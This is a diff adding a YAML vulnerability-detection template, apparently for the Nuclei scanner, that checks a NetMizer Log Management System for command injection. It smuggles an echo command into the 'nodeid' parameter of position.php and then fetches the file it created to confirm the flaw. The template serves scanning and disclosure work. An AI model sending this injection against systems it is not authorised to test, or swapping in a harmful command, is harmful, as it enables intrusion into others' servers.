@@ -1,0 +1,37 @@
+id: poc-yaml-netmizer-log-management-system-position-rce
+info:
+  name: NetMizer Log Management System Position Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+variables:
+  t1: "{{rand_int(100,1000)}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: inject-command
+    method: GET
+    path:
+      - "/data/search/position.php?action=file&nodeid=|echo%20\"vulnerability\">test{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(find_json(body, 'success'), 'success')
+          - contains(find_json(body, 'total'), '0')
+  - id: verify-injection
+    method: GET
+    path:
+      - "/data/search/test{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vulnerability"
+        part: body
